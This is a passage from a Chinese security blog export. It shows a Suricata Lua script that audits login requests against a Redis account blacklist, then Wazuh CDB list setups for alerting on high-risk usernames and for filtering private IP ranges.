<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ make</span><br><span class="line">cc -c -O3 -Wall -pedantic -DNDEBUG  -I/usr/<span class="built_in">local</span>/include/luajit-2.0 -fpic -o lua_cjson.o lua_cjson.c</span><br><span class="line">In file included from lua_cjson.c:47:0:</span><br><span class="line">fpconv.h:15:20: warning: inline <span class="keyword">function</span> ‘fpconv_init’ declared but never defined</span><br><span class="line"> extern inline void fpconv_init();</span><br><span class="line">                    ^~~~~~~~~~~</span><br><span class="line">cc -c -O3 -Wall -pedantic -DNDEBUG  -I/usr/<span class="built_in">local</span>/include/luajit-2.0 -fpic -o strbuf.o strbuf.c</span><br><span class="line">cc -c -O3 -Wall -pedantic -DNDEBUG  -I/usr/<span class="built_in">local</span>/include/luajit-2.0 -fpic -o fpconv.o fpconv.c</span><br><span class="line">cc  -shared -o cjson.so lua_cjson.o strbuf.o fpconv.o</span><br><span class="line"></span><br><span class="line">$ make install</span><br><span class="line">mkdir -p //usr/<span class="built_in">local</span>/lib/lua/5.1</span><br><span class="line">cp cjson.so //usr/<span class="built_in">local</span>/lib/lua/5.1</span><br><span class="line">chmod 755 //usr/<span class="built_in">local</span>/lib/lua/5.1/cjson.so</span><br></pre></td></tr></table></figure>



<h3 id="MD5"><a href="#MD5" class="headerlink" title="MD5"></a><a href="https://github.com/kikito/md5.lua">MD5</a></h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ luarocks install --server=http://luarocks.org/manifests/kikito md5</span><br></pre></td></tr></table></figure>



<h1 id="代码示例"><a href="#代码示例" class="headerlink" title="代码示例"></a>代码示例</h1><p>扩展登录接口审计脚本: <code>http_audit.lua</code></p>
<figure class="highlight lua"><table><tr><td class="code"><pre><span class="line">json = <span class="built_in">require</span> <span class="string">&quot;cjson.safe&quot;</span></span><br><span class="line">md5 = <span class="built_in">require</span> <span class="string">&quot;md5&quot;</span></span><br><span class="line">redis = <span class="built_in">require</span> <span class="string">&quot;redis&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">-- 登录接口</span></span><br><span class="line">login_url = <span class="string">&quot;/login&quot;</span></span><br><span class="line"><span class="comment">-- 登录错误提示</span></span><br><span class="line">success_code = <span class="number">0</span></span><br><span class="line"><span class="comment">-- event_name</span></span><br><span class="line">event_name = <span class="string">&quot;login_audit&quot;</span></span><br><span class="line"><span class="comment">-- event_type</span></span><br><span class="line">event_type = <span class="string">&quot;lua&quot;</span></span><br><span class="line"><span class="comment">-- logs</span></span><br><span class="line">name = <span class="string">&quot;login_audit.json&quot;</span></span><br><span class="line"><span class="comment">-- 协议</span></span><br><span class="line">proto = <span class="string">&quot;TCP&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">-- redis_config</span></span><br><span class="line">host = <span class="string">&quot;127.0.0.1&quot;</span></span><br><span class="line">port = <span class="number">6379</span></span><br><span class="line"></span><br><span class="line"><span class="comment">-- common_mapping</span></span><br><span class="line">http_common_mapping = <span class="string">&#x27;&#123;&quot;accept&quot;:&quot;accept&quot;,&quot;accept-charset&quot;:&quot;accept_charset&quot;,&quot;accept-encoding&quot;:&quot;accept_encoding&quot;,&quot;accept-language&quot;:&quot;accept_language&quot;,&quot;user-agent&quot;:&quot;user_agent&quot;&#125;&#x27;</span></span><br><span class="line">common_mapping_table = json.decode(http_common_mapping)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">-- defind functioin</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">md5Encode</span><span class="params">(args)</span></span></span><br><span class="line">    m = md5.new()</span><br><span class="line">    m:update(args)</span><br><span class="line">    <span class="keyword">return</span> md5.tohex(m:finish())</span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">formatStr</span><span class="params">(args)</span></span></span><br><span class="line">    t = &#123;&#125;</span><br><span class="line">    ios = <span class="built_in">string</span>.<span class="built_in">match</span>(args, <span class="string">&#x27;canon&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> ios ~= <span class="literal">nil</span> <span class="keyword">then</span></span><br><span class="line">        mail = <span class="string">&#x27;email&quot;%s+(.-)%s&#x27;</span></span><br><span class="line">        t[<span class="string">&#x27;email&#x27;</span>] = <span class="built_in">string</span>.<span class="built_in">match</span>(args, mail)</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        data = <span class="built_in">string</span>.split(args, <span class="string">&#x27;&amp;&#x27;</span>)</span><br><span class="line">        <span class="keyword">for</span> n, v <span class="keyword">in</span> <span class="built_in">ipairs</span>(data) <span class="keyword">do</span></span><br><span class="line">            d = <span class="built_in">string</span>.split(v, <span class="string">&#x27;=&#x27;</span>)</span><br><span class="line">            t[d[<span class="number">1</span>]] = d[<span class="number">2</span>]</span><br><span class="line">        <span class="keyword">end</span></span><br><span class="line">    <span class="keyword">end</span></span><br><span class="line">    <span class="keyword">return</span> t</span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">string.split</span><span class="params">(s, p)</span></span></span><br><span class="line">    rt = &#123;&#125;</span><br><span class="line">    <span class="built_in">string</span>.<span class="built_in">gsub</span>(s, <span class="string">&#x27;[^&#x27;</span>..p..<span class="string">&#x27;]+&#x27;</span>, <span class="function"><span class="keyword">function</span><span class="params">(w)</span></span> <span class="built_in">table</span>.<span class="built_in">insert</span>(rt, w) <span class="keyword">end</span> )</span><br><span class="line">    <span class="keyword">return</span> rt</span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"></span><br><span class="line"><span class="comment">-- default function</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">init</span> <span class="params">(args)</span></span></span><br><span class="line">    <span class="keyword">local</span> needs = &#123;&#125;</span><br><span class="line">    needs[<span class="string">&quot;protocol&quot;</span>] = <span class="string">&quot;http&quot;</span></span><br><span class="line">    <span class="keyword">return</span> needs</span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">setup</span> <span class="params">(args)</span></span></span><br><span class="line">    filename = SCLogPath() .. <span class="string">&quot;/&quot;</span> .. name</span><br><span class="line">    file = <span class="built_in">assert</span>(<span class="built_in">io</span>.<span class="built_in">open</span>(filename, <span class="string">&quot;a&quot;</span>))</span><br><span class="line">    SCLogInfo(<span class="string">&quot;app_login_audit filename: &quot;</span> .. filename)</span><br><span class="line">    http = <span class="number">0</span></span><br><span class="line">  </span><br><span class="line">    <span class="comment">-- Connect Redis Server</span></span><br><span class="line">    SCLogInfo(<span class="string">&quot;Connect Redis Server...&quot;</span>)</span><br><span class="line">    client = redis.connect(host, port)</span><br><span class="line">    response = client:ping()</span><br><span class="line">    <span class="keyword">if</span> response <span class="keyword">then</span></span><br><span class="line">        SCLogInfo(<span class="string">&quot;Redis Server connection succeeded.&quot;</span>)</span><br><span class="line">    <span class="keyword">end</span></span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">log</span><span class="params">(args)</span></span></span><br><span class="line">    <span class="comment">-- init tables</span></span><br><span class="line">    http_table = &#123;&#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">-- ti tables</span></span><br><span class="line">    ti = &#123;</span><br><span class="line">        tags = &#123;&#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">-- init score</span></span><br><span class="line">    score = <span class="number">50</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">-- http_hostname &amp; http_url</span></span><br><span class="line">    http_hostname = HttpGetRequestHost()</span><br><span class="line">    http_url = HttpGetRequestUriNormalized()</span><br><span class="line">    </span><br><span class="line">    <span class="comment">-- http_method</span></span><br><span class="line">    rl = HttpGetRequestLine()</span><br><span class="line">    <span class="keyword">if</span> rl <span class="keyword">then</span></span><br><span class="line">        http_method = <span class="built_in">string</span>.<span class="built_in">match</span>(rl, <span class="string">&quot;%w+&quot;</span>)</span><br><span class="line">        <span class="keyword">if</span> http_method <span class="keyword">then</span></span><br><span class="line">            http_table[<span class="string">&quot;method&quot;</span>] = http_method</span><br><span class="line">        <span class="keyword">end</span></span><br><span class="line">    <span class="keyword">end</span></span><br><span class="line">	</span><br><span class="line">	  <span class="comment">-- 为了保证 Suricata 的性能不受影响, 严格控制过滤条件</span></span><br><span class="line">    <span class="keyword">if</span> http_url == login_url <span class="keyword">and</span> http_method == <span class="string">&quot;POST&quot;</span> <span class="keyword">then</span></span><br><span class="line">        http_table[<span class="string">&quot;hostname&quot;</span>] = http_hostname</span><br><span class="line">        http_table[<span class="string">&quot;url&quot;</span>] = http_url</span><br><span class="line">        http_table[<span class="string">&quot;url_path&quot;</span>] = http_url</span><br><span class="line">        </span><br><span class="line">        <span class="comment">-- http_status &amp; http_protocol</span></span><br><span class="line">        rsl = HttpGetResponseLine()</span><br><span class="line">        <span class="keyword">if</span> rsl <span class="keyword">then</span></span><br><span class="line">            status_code = <span class="built_in">string</span>.<span class="built_in">match</span>(rsl, <span class="string">&quot;%s(%d+)%s&quot;</span>)</span><br><span class="line">            http_table[<span class="string">&quot;status&quot;</span>] = <span class="built_in">tonumber</span>(status_code)</span><br><span class="line"></span><br><span class="line">            http_protocol = <span class="built_in">string</span>.<span class="built_in">match</span>(rsl, <span class="string">&quot;(.-)%s&quot;</span>)</span><br><span class="line">            http_table[<span class="string">&quot;protocol&quot;</span>] = http_protocol</span><br><span class="line">        <span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">-- login_results</span></span><br><span class="line">        a, o, e = HttpGetResponseBody()</span><br><span class="line">        <span class="keyword">if</span> a <span class="keyword">then</span></span><br><span class="line">            <span class="keyword">for</span> n, v <span class="keyword">in</span> <span class="built_in">ipairs</span>(a) <span class="keyword">do</span></span><br><span class="line">                body = json.decode(v)</span><br><span class="line">                results_code = <span class="built_in">tonumber</span>(body[<span class="string">&quot;code&quot;</span>])</span><br><span class="line">                <span class="keyword">if</span> results_code == success_code <span class="keyword">then</span></span><br><span class="line">                    http_table[<span class="string">&quot;results&quot;</span>] = <span class="string">&quot;success&quot;</span></span><br><span class="line">                <span class="keyword">else</span></span><br><span class="line">                    http_table[<span class="string">&quot;results&quot;</span>] = <span class="string">&quot;failed&quot;</span></span><br><span class="line">                <span class="keyword">end</span></span><br><span class="line">            <span class="keyword">end</span></span><br><span class="line">            http_table[<span class="string">&quot;results_code&quot;</span>] = results_code</span><br><span class="line">        <span class="keyword">end</span></span><br><span class="line">        </span><br><span class="line">        <span class="comment">--[[</span></span><br><span class="line"><span class="comment">            1. 获取用户登录email 并查询 Redis中是否存在该账号</span></span><br><span class="line"><span class="comment">            2. 根据结果进行相应的打分以及tags标注</span></span><br><span class="line"><span class="comment">        ]]</span></span><br><span class="line">        <span class="comment">-- </span></span><br><span class="line">        a, o, e = HttpGetRequestBody()</span><br><span class="line">        <span class="keyword">if</span> a <span class="keyword">then</span></span><br><span class="line">            <span class="keyword">for</span> n, v <span class="keyword">in</span> <span class="built_in">ipairs</span>(a) <span class="keyword">do</span></span><br><span class="line">                res = formatStr(v)</span><br><span class="line">                <span class="keyword">if</span> res[<span class="string">&quot;email&quot;</span>] <span class="keyword">then</span></span><br><span class="line">                    <span class="comment">-- 查询Redis对比黑名单</span></span><br><span class="line">                    black_ioc = client:get(res[<span class="string">&quot;email&quot;</span>])</span><br><span class="line">                    <span class="keyword">if</span> black_ioc <span class="keyword">then</span></span><br><span class="line">                        ti[<span class="string">&quot;provider&quot;</span>] = <span class="string">&quot;Canon&quot;</span></span><br><span class="line">                        ti[<span class="string">&quot;producer&quot;</span>] = <span class="string">&quot;NTA&quot;</span></span><br><span class="line">                        <span class="built_in">table</span>.<span class="built_in">insert</span>(ti[<span class="string">&quot;tags&quot;</span>], <span class="string">&quot;account in blacklist&quot;</span>)</span><br><span class="line">                        score = score + <span class="number">10</span></span><br><span class="line">                    <span class="keyword">end</span></span><br><span class="line">                <span class="keyword">end</span></span><br><span class="line">            <span class="keyword">end</span></span><br><span class="line">        <span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">-- RequestHeaders</span></span><br><span class="line">        rh = HttpGetRequestHeaders()</span><br><span class="line">        <span class="keyword">if</span> rh <span class="keyword">then</span></span><br><span class="line">            <span class="keyword">for</span> k, v <span class="keyword">in</span> <span class="built_in">pairs</span>(rh) <span class="keyword">do</span></span><br><span class="line">                key = <span class="built_in">string</span>.<span class="built_in">lower</span>(k)</span><br><span class="line">                request_var = request_mapping_table[key]</span><br><span class="line">                <span class="keyword">if</span> request_var <span class="keyword">then</span></span><br><span class="line">                    http_table[request_var] = v</span><br><span class="line">                <span class="keyword">end</span></span><br><span class="line">            <span class="keyword">end</span></span><br><span class="line">        <span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">-- ResponseHeaders</span></span><br><span class="line">        rsh = HttpGetResponseHeaders()</span><br><span class="line">        <span class="keyword">if</span> rsh <span class="keyword">then</span></span><br><span class="line">            <span class="keyword">for</span> k, v <span class="keyword">in</span> <span class="built_in">pairs</span>(rsh) <span class="keyword">do</span></span><br><span class="line">                key = <span class="built_in">string</span>.<span class="built_in">lower</span>(k)</span><br><span class="line">                response_var = response_mapping_table[key]</span><br><span class="line">                <span class="keyword">if</span> response_var <span class="keyword">then</span></span><br><span class="line">                    http_table[response_var] = v</span><br><span class="line">                <span class="keyword">end</span></span><br><span class="line">            <span class="keyword">end</span></span><br><span class="line">        <span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">-- timestring</span></span><br><span class="line">        sec, usec = SCPacketTimestamp()</span><br><span class="line">        timestring = <span class="built_in">os</span>.<span class="built_in">date</span>(<span class="string">&quot;!%Y-%m-%dT%T&quot;</span>, sec) .. <span class="string">&#x27;.&#x27;</span> .. usec .. <span class="string">&#x27;+0000&#x27;</span></span><br><span class="line">        </span><br><span class="line">        <span class="comment">-- flow_info</span></span><br><span class="line">        ip_version, src_ip, dst_ip, protocol, src_port, dst_port = SCFlowTuple()</span><br><span class="line"></span><br><span class="line">        <span class="comment">-- flow_id</span></span><br><span class="line">        id = SCFlowId()</span><br><span class="line">        flow_id = <span class="built_in">string</span>.<span class="built_in">format</span>(<span class="string">&quot;%.0f&quot;</span>, id)</span><br><span class="line">        flow_id = <span class="built_in">tonumber</span>(flow_id)</span><br><span class="line"></span><br><span class="line">        <span class="comment">-- true_ip</span></span><br><span class="line">        true_client_ip = HttpGetRequestHeader(<span class="string">&quot;True-Client-IP&quot;</span>)</span><br><span class="line">        <span class="keyword">if</span> true_client_ip ~= <span class="literal">nil</span> <span class="keyword">then</span></span><br><span class="line">            src_ip = true_client_ip</span><br><span class="line">        <span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">-- session_id</span></span><br><span class="line">        tetrad = src_ip .. src_port .. dst_ip .. dst_port</span><br><span class="line">        session_id = md5Encode(tetrad)</span><br><span class="line"></span><br><span class="line">        <span class="comment">-- table</span></span><br><span class="line">        raw_data = &#123;</span><br><span class="line">            timestamp = timestring,</span><br><span class="line">            flow_id = flow_id,</span><br><span class="line">            session_id = session_id,</span><br><span class="line">            src_ip = src_ip,</span><br><span class="line">            src_port = src_port,</span><br><span class="line">            proto = proto,</span><br><span class="line">            dest_ip = dst_ip,</span><br><span class="line">            dest_port = dst_port,</span><br><span class="line">            event_name = event_name,</span><br><span class="line">            event_type = event_type,</span><br><span class="line">            app_type = app_type,</span><br><span class="line">            http = http_table,</span><br><span class="line">            ti = ti,</span><br><span class="line">            score = score</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">-- json encode</span></span><br><span class="line">        data = json.encode(raw_data)</span><br><span class="line"></span><br><span class="line">        file:<span class="built_in">write</span>(data .. <span class="string">&quot;\n&quot;</span>)</span><br><span class="line">        file:<span class="built_in">flush</span>()</span><br><span class="line"></span><br><span class="line">        http = http + <span class="number">1</span></span><br><span class="line">    <span class="keyword">end</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">deinit</span> <span class="params">(args)</span></span></span><br><span class="line">    SCLogInfo (<span class="string">&quot;app_login_audit transactions logged: &quot;</span> .. http);</span><br><span class="line">    file:<span class="built_in">close</span>(file)</span><br><span class="line"><span class="keyword">end</span></span><br></pre></td></tr></table></figure>



<p><strong>简单说下以上脚本的功能:</strong></p>
<ol>
<li>登录接口的用户名审计(废话…); </li>
<li>通过请求<strong>Redis</strong>比对当前用户是否在黑名单中, 并进行相应的打分、标签处理;</li>
<li>根据自定义的需求获取的http headers, 这个对于业务安全上还是有点用的;</li>
<li>针对<strong>CDN</strong>或者Nginx这种场景下, 可以直接对 xff 或者 true_client_ip 进行四元组的hash, 得到<strong>session_id</strong>, 这样溯源的时候会比较方便。因为在这种场景下传统的四层<strong>flow_id</strong>就不是那么有用了。</li>
<li>后续可以追加一些简单的检测方法, 例如:<ol>
<li>检查请求头中的字段是否完成;</li>
<li>检查请求头中的某个字段长度是否符合合规;</li>
<li>……</li>
</ol>
</li>
</ol>
<p><strong>配置Suricata启用Lua脚本</strong></p>
<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="bullet">-</span> <span class="attr">lua:</span></span><br><span class="line">    <span class="attr">enabled:</span> <span class="literal">yes</span></span><br><span class="line">    <span class="attr">scripts-dir:</span> <span class="string">/etc/suricata/lua-output/</span></span><br><span class="line">    <span class="attr">scripts:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">login_audit.lua</span></span><br></pre></td></tr></table></figure>



<p><strong>启用Suricata</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ suricata -vvv --pfring -k none -c /etc/suricata/suricata.yaml</span><br></pre></td></tr></table></figure>

<p><em><strong>注: 这里<code>-vvv</code> 参数建议加上. 如果你的Lua脚本有一些问题, 如果加上了这个参数, 就可以通过这个日志看出。</strong></em></p>
<h1 id="日志样例"><a href="#日志样例" class="headerlink" title="日志样例"></a>日志样例</h1><figure class="highlight json"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="attr">&quot;src_port&quot;</span>: <span class="number">62722</span>,</span><br><span class="line">    <span class="attr">&quot;score&quot;</span>: <span class="number">65</span>,</span><br><span class="line">    <span class="attr">&quot;session_id&quot;</span>: <span class="string">&quot;c863aeb2ef8d1b37f3257f8c210bf440&quot;</span>,</span><br><span class="line">    <span class="attr">&quot;ti&quot;</span>: &#123;</span><br><span class="line">        <span class="attr">&quot;tags&quot;</span>: [</span><br><span class="line">            <span class="string">&quot;account in blacklist&quot;</span></span><br><span class="line">        ],</span><br><span class="line">        <span class="attr">&quot;provider&quot;</span>: <span class="string">&quot;Canon&quot;</span>,</span><br><span class="line">        <span class="attr">&quot;producer&quot;</span>: <span class="string">&quot;NTA&quot;</span></span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="attr">&quot;alert&quot;</span>: &#123;</span><br><span class="line">        <span class="attr">&quot;alerted&quot;</span>: <span class="literal">true</span>,</span><br><span class="line">        <span class="attr">&quot;rules&quot;</span>: &#123;</span><br><span class="line">            <span class="attr">&quot;请求头校验&quot;</span>: <span class="string">&quot;dev-id&quot;</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="attr">&quot;proto&quot;</span>: <span class="string">&quot;TCP&quot;</span>,</span><br><span class="line">    <span class="attr">&quot;flow_id&quot;</span>: <span class="string">&quot;1064295903559076&quot;</span>,</span><br><span class="line">    <span class="attr">&quot;timestamp&quot;</span>: <span class="string">&quot;2019-10-25T08:33:55.585519+0000&quot;</span>,</span><br><span class="line">    <span class="attr">&quot;event_type&quot;</span>: <span class="string">&quot;lua&quot;</span>,</span><br><span class="line">    <span class="attr">&quot;src_ip&quot;</span>: <span class="string">&quot;1.1.1.1&quot;</span>,</span><br><span class="line">    <span class="attr">&quot;dest_port&quot;</span>: <span class="number">80</span>,</span><br><span class="line">    <span class="attr">&quot;http&quot;</span>: &#123;</span><br><span class="line">        <span class="attr">&quot;response_content_length&quot;</span>: <span class="string">&quot;96&quot;</span>,</span><br><span class="line">        <span class="attr">&quot;response_content_type&quot;</span>: <span class="string">&quot;application/json; charset=UTF-8&quot;</span>,</span><br><span class="line">        <span class="attr">&quot;accept_encoding&quot;</span>: <span class="string">&quot;gzip&quot;</span>,</span><br><span class="line">        <span class="attr">&quot;accept&quot;</span>: <span class="string">&quot;application/json&quot;</span>,</span><br><span class="line">        <span class="attr">&quot;results_code&quot;</span>: <span class="number">400504</span>,</span><br><span class="line">        <span class="attr">&quot;server&quot;</span>: <span class="string">&quot;nginx&quot;</span>,</span><br><span class="line">        <span class="attr">&quot;date&quot;</span>: <span class="string">&quot;Fri, 25 Oct 2019 08:33:55 GMT&quot;</span>,</span><br><span class="line">        <span class="attr">&quot;app_version&quot;</span>: <span class="string">&quot;6.6.0&quot;</span>,</span><br><span class="line">        <span class="attr">&quot;request_content_type&quot;</span>: <span class="string">&quot;application/x-www-form-urlencoded&quot;</span>,</span><br><span class="line">        <span class="attr">&quot;user_agent&quot;</span>: <span class="string">&quot;okhttp/3.12.0&quot;</span>,</span><br><span class="line">        <span class="attr">&quot;url&quot;</span>: <span class="string">&quot;/login&quot;</span>,</span><br><span class="line">        <span class="attr">&quot;email&quot;</span>: <span class="string">&quot;canon@gmail.com&quot;</span>,</span><br><span class="line">        <span class="attr">&quot;results&quot;</span>: <span class="string">&quot;failed&quot;</span>,</span><br><span class="line">        <span class="attr">&quot;pragma&quot;</span>: <span class="string">&quot;no-cache&quot;</span>,-</span><br><span class="line">        <span class="attr">&quot;cache_control&quot;</span>: <span class="string">&quot;no-cache, max-age=0, no-store&quot;</span>,</span><br><span class="line">        <span class="attr">&quot;connection&quot;</span>: <span class="string">&quot;keep-alive&quot;</span>,</span><br><span class="line">        <span class="attr">&quot;status&quot;</span>: <span class="number">200</span>,</span><br><span class="line">        <span class="attr">&quot;protocol&quot;</span>: <span class="string">&quot;HTTP/1.1&quot;</span>,</span><br><span class="line">        <span class="attr">&quot;hostname&quot;</span>: <span class="string">&quot;x.x.x.x&quot;</span>,</span><br><span class="line">        <span class="attr">&quot;url_path&quot;</span>: <span class="string">&quot;/login&quot;</span>,</span><br><span class="line">        <span class="attr">&quot;method&quot;</span>: <span class="string">&quot;POST&quot;</span>,</span><br><span class="line">        <span class="attr">&quot;device&quot;</span>: <span class="string">&quot;RMX1920 Android8.0.0&quot;</span>,</span><br><span class="line">        <span class="attr">&quot;device_type&quot;</span>: <span class="string">&quot;Android&quot;</span>,</span><br><span class="line">        <span class="attr">&quot;request_content_length&quot;</span>: <span class="string">&quot;39&quot;</span></span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="attr">&quot;event_name&quot;</span>: <span class="string">&quot;login_audit&quot;</span>,</span><br><span class="line">    <span class="attr">&quot;dest_ip&quot;</span>: <span class="string">&quot;2.2.2.2&quot;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>NIDS</category>
      </categories>
      <tags>
        <tag>Suricata</tag>
      </tags>
  </entry>
  <entry>
    <title>Wazuh - 黑名单匹配告警(CDB list)</title>
    <url>/2019/10/18/Wazuh-Using-CDB-lists/</url>
    <content><![CDATA[<p><strong>需求:</strong></p>
<p>​        现有一批高危用户, 需要实时关注该账号的登录情况。由于之前已经写好了一个针对用户登录账号的审计规则, 因此, 这里需要用到**<a href="https://documentation.wazuh.com/3.10/user-manual/ruleset/cdb-list.html">Wazuh CDB list</a>**这个功能(<em>此功能主要用例是创建用户，IP或域名的白/黑列表。</em>)消费审计规则数据即可。</p>
<hr>
<ol>
<li><strong>新建列表</strong></li>
</ol>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ more blacklist</span><br><span class="line"></span><br><span class="line">admin:</span><br><span class="line">root:</span><br><span class="line">administrator:</span><br></pre></td></tr></table></figure>

<ol start="2">
<li><strong>将列表文件添加到<code>ossec.conf</code></strong></li>
</ol>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ more ossec.conf</span><br><span class="line"></span><br><span class="line">&lt;ossec_config&gt;</span><br><span class="line">	&lt;ruleset&gt;</span><br><span class="line">    &lt;!-- User-defined CDB list --&gt;</span><br><span class="line">    &lt;list&gt;etc/lists/blacklist&lt;/list&gt;</span><br><span class="line">	&lt;/ruleset&gt;</span><br><span class="line">&lt;/ossec_config&gt;</span><br></pre></td></tr></table></figure>

<ol start="3">
<li><strong>编译列表</strong></li>
</ol>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ /var/ossec/bin/ossec-makelists</span><br><span class="line"></span><br><span class="line"> * File etc/lists/blacklist.cdb needs to be updated</span><br></pre></td></tr></table></figure>

<ol start="4">
<li><strong>重启进程</strong></li>
</ol>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ sudo systemctl restart wazuh-manager</span><br></pre></td></tr></table></figure>

<ol start="5">
<li><strong>配置规则</strong></li>
</ol>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">group</span> <span class="attr">name</span>=<span class="string">&quot;local,blacklist,&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">&lt;!-- Defind blacklist Rules --&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- ID: 100150 - 100199 --&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">rule</span> <span class="attr">id</span>=<span class="string">&quot;100163&quot;</span> <span class="attr">level</span>=<span class="string">&quot;12&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">if_sid</span>&gt;</span>100303<span class="tag">&lt;/<span class="name">if_sid</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">list</span> <span class="attr">field</span>=<span class="string">&quot;http.email&quot;</span> <span class="attr">lookup</span>=<span class="string">&quot;match_key&quot;</span>&gt;</span>etc/lists/blacklist<span class="tag">&lt;/<span class="name">list</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">description</span>&gt;</span>Wazuh Rules - High-risk user login detected. $(src_ip) -&gt; $(http.email) -&gt; $(http.hostname) -&gt; $(http.url) = $(http.results).<span class="tag">&lt;/<span class="name">description</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">options</span>&gt;</span>no_full_log<span class="tag">&lt;/<span class="name">options</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">group</span>&gt;</span>blacklist,<span class="tag">&lt;/<span class="name">group</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">rule</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">group</span>&gt;</span></span><br></pre></td></tr></table></figure>

<ol start="6">
<li><strong>测试规则</strong></li>
</ol>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ ./ossec-logtest</span><br><span class="line">2019/10/18 15:06:47 ossec-testrule: INFO: Started (pid: 2184).</span><br><span class="line">ossec-testrule: Type one <span class="built_in">log</span> per line.</span><br><span class="line"></span><br><span class="line">**Phase 3: Completed filtering (rules).</span><br><span class="line">       Rule id: <span class="string">&#x27;100163&#x27;</span></span><br><span class="line">       Level: <span class="string">&#x27;12&#x27;</span></span><br><span class="line">       Description: <span class="string">&#x27;Wazuh Rules - High-risk user login detected. 1.1.1.1 -&gt; admin -&gt; canon88.github.io -&gt; /user/login = success.&#x27;</span></span><br><span class="line">**Alert to be generated.</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>HIDS</category>
      </categories>
      <tags>
        <tag>Wazuh</tag>
      </tags>
  </entry>
  <entry>
    <title>Wazuh - 利用CDB list过滤私网IP地址</title>
    <url>/2020/01/31/Wazuh-%E5%88%A9%E7%94%A8CDB-list%E8%BF%87%E6%BB%A4%E7%A7%81%E7%BD%91IP%E5%9C%B0%E5%9D%80/</url>
    <content><![CDATA[<h4 id="需求"><a href="#需求" class="headerlink" title="需求"></a>需求</h4><p>​        目前平台接入了<strong>Suricata</strong>的告警规则, 由于镜像源的关系部分规则产生了**’误’**告警, 因此需要针对这部分规则进行IP地址的过滤。</p>
<h4 id="解决方法"><a href="#解决方法" class="headerlink" title="解决方法"></a>解决方法</h4><ol>
<li>修改Suricata的规则, 如果你的**’误’**告警量很大且为了性能考虑, 推荐直接修改Suricata的规则。</li>
<li>由于我这边的Suricata告警都是利用Wazuh进行**’消费’<strong>的。因此, 我这边直接采用了</strong><a href="https://documentation.wazuh.com/3.10/user-manual/ruleset/cdb-list.html">Wazuh CDB list</a>**这个功能进行指定IP地址的过滤。</li>
</ol>
<h4 id="步骤"><a href="#步骤" class="headerlink" title="步骤"></a>步骤</h4><h5 id="1-创建-CDB-list"><a href="#1-创建-CDB-list" class="headerlink" title="1. 创建 CDB list"></a>1. 创建 CDB list</h5><blockquote>
<p>Each key must be unique and is terminated with a colon <code>:</code>.</p>
<p>For IP addresses the dot notation is used for subnet matches:</p>
</blockquote>
<table>
<thead>
<tr>
<th>key</th>
<th>CIDR</th>
<th>Possible matches</th>
</tr>
</thead>
<tbody><tr>
<td>192.168.:</td>
<td>192.168.0.0/16</td>
<td>192.168.0.0 - 192.168.255.255</td>
</tr>
<tr>
<td>172.16.19.:</td>
<td>172.16.19.0/24</td>
<td>172.16.19.0 - 172.16.19.255</td>
</tr>
<tr>
<td>10.1.1.1:</td>
<td>10.1.1.1/32</td>
<td>10.1.1.1</td>
</tr>
</tbody></table>
